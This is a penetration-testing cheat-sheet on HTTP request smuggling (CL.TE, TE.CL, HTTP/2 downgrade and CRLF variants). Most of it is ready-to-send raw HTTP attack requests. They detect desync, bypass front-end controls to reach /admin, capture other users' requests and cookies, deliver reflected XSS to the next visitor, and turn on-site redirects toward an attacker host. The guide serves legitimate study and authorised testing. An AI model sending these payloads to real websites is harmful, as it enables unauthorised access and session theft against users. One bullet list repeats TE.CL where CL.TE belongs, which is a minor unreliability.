# HTTP request smuggling

## HTTP request smuggling

<details>

<summary>General info</summary>

* HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.

- Request smuggling is associated to HTTP/1 requests but can also affect HTTP/2-supported websites based on their backend structure.

* Modern web apps often use chains of HTTP servers, with users sending requests to a front-end server (sometimes referred to as a load balancer or reverse proxy), which in turn forwards requests to multiple back-end servers.

- Front-end and back-end systems must agree on request boundaries to prevent ambiguous requests that attackers can exploit

</details>

<details>

<summary>How do HTTP request smuggling vulnerabilities arise?</summary>

* HTTP request smuggling vulnerabilities often occur due to the HTTP/1 specification offering two methods to define the request's end: the `Content-Length header` and `Transfer-Encoding` header.
  * The `Content-Length header` specifies the length of the message body in bytes
  * The `Transfer-Encoding` header specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data
    * Each chunk comprises a size in hexadecimal bytes, a newline, and the chunk's content. The message concludes with a zero-sized chunk.
  * TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
  * TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
  * TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

</details>

## <mark style="color:yellow;">Identification</mark>

{% hint style="warning" %}
**Important**: use HTTP/1.1 protocol, not HTTP/2. In burp change it using Inspector.
{% endhint %}

### <mark style="color:yellow;">**CL.TE**</mark>

```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 4\r\n
\r\n
1\r\n
A\r\n
X
```

`Content-Length=4` -> `1` `\r` `\n` `A`

* The **front-end** server processes the initial chunk based on the Transfer-Encoding header, forwarding only part of the request while omitting the `X`.&#x20;
* After processing the first chunk, the **backend** server waits for the next one, causing a noticeable time delay.

### <mark style="color:yellow;">TE.CL</mark>

```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
X
```

`Content-Length=6` -> `0` `\r` `\n` `\r` `\n` `X`

The back-end server, relying on the Content-Length header, waits for additional message body content, resulting in a noticeable time delay.

{% hint style="warning" %}
**Warning**: The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
{% endhint %}

## <mark style="color:yellow;">Confirmation/Exploitation</mark>

Normal request

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

### <mark style="color:yellow;">**CL.TE**</mark>

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

`Content-Legth: 49` -> all chars until `Foo:x` (include `\r\n`)

`e` (hex) -> Lenght `q=smuggling&x=`

Then send normal request. This will cause the subsequent "normal" request to look like this:

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The server will respond with status code 404, indicating that the attack successful.

### <mark style="color:yellow;">**TE.CL**</mark>

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0\r\n
\r\n
```

`7b` -> all chars from `GET` until `x=`

`Content-Legth: 4` -> `7` `c` `\r` `\n`

{% hint style="info" %}
**Note**: Update Content-Length must be unchecked
{% endhint %}

## <mark style="color:yellow;">Exploitation</mark> <a href="#using-http-request-smuggling-to-bypass-front-end-security-controls" id="using-http-request-smuggling-to-bypass-front-end-security-controls"></a>

### <mark style="color:yellow;">Bypass front-end security controls</mark> <a href="#using-http-request-smuggling-to-bypass-front-end-security-controls" id="using-http-request-smuggling-to-bypass-front-end-security-controls"></a>

<mark style="color:yellow;">**CL.TE**</mark>

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

When you go to `/home`, the following request will be made&#x20;

```http
GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

* The front-end server sees two requests here, both for `/home`, and so the requests are forwarded to the back-end server.&#x20;
* The back-end server sees requests for `/home` and `/admin`, assumes they've passed front-end controls, and grants access to the restricted URL.

### <mark style="color:yellow;">Revealing front-end request rewriting</mark> <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

<mark style="color:yellow;">**CL.TE**</mark>

Find a request that reflects the value

```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=user@normal-user.net
```

```html
<input id="email" value="user@normal-user.net" type="text">
```

Use the following request smuggling attack to reveal the rewriting

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=
```

```html
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

### <mark style="color:yellow;">Capturing other users' requests</mark> <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

<mark style="color:yellow;">**CL.TE**</mark>

Smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 198
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Cookie: session=dL3MaAvRhsnHdriaFnPxSdvXdt3jx6B1
Content-Length: 650

csrf=ihmEx8D&postId=1&name=test&email=test@test.test&comment=
```

### <mark style="color:yellow;">Exploit reflected XSS</mark>

<mark style="color:yellow;">**CL.TE**</mark>

You can use a request smuggling attack to target other users of the application. This method is better than standard reflected XSS because it doesn't require victim interaction and can exploit XSS in areas like HTTP headers, which are not possible to control in typical attacks.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

The next user's request is appended to the smuggled one, delivering the XSS payload in their response.

### <mark style="color:yellow;">Open redirect</mark> <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

<mark style="color:yellow;">**CL.TE**</mark>

```http
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

Exploit

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

## <mark style="color:yellow;">Content-Length in the smuggled request</mark>

The value in the `Content-Length` header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.

## <mark style="color:yellow;">HTTP/2 request smuggling</mark>

**HTTP/2 downgrading**

HTTP/2 downgrading converts HTTP/2 requests into HTTP/1 syntax, allowing web servers and proxies to support HTTP/2 clients while communicating with HTTP/1 back-end servers.

## <mark style="color:yellow;">Identification</mark>

### <mark style="color:yellow;">H2.CL</mark> <a href="#h2-cl-vulnerabilities" id="h2-cl-vulnerabilities"></a>

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Length: 0

GET /404 HTTP/1.1
Foo: x
```

Then send another request and you'll get `/404` .

### <mark style="color:yellow;">H2.TE</mark> <a href="#h2-te-vulnerabilities" id="h2-te-vulnerabilities"></a>

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

## <mark style="color:yellow;">Exploitation</mark>

### <mark style="color:yellow;">H2.CL</mark> <a href="#h2-cl-vulnerabilities" id="h2-cl-vulnerabilities"></a>

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 5

x=1
```

### <mark style="color:yellow;">H2.TE</mark> <a href="#h2-te-vulnerabilities" id="h2-te-vulnerabilities"></a>

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

## <mark style="color:yellow;">Request smuggling via CRLF injection</mark> <a href="#request-smuggling-via-crlf-injection" id="request-smuggling-via-crlf-injection"></a>

In HTTP/2 messages `\r\n` no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split. when this is rewritten as an HTTP/1 request, the `\r\n` will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers.

E.g. with **H2.TE**

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
foo: \r\nTransfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

{% hint style="info" %}
**Note**: to inject newlines into HTTP/2 headers, in burp use the Inspector to drill down into the header, then press the `Shift + Return` keys.
{% endhint %}



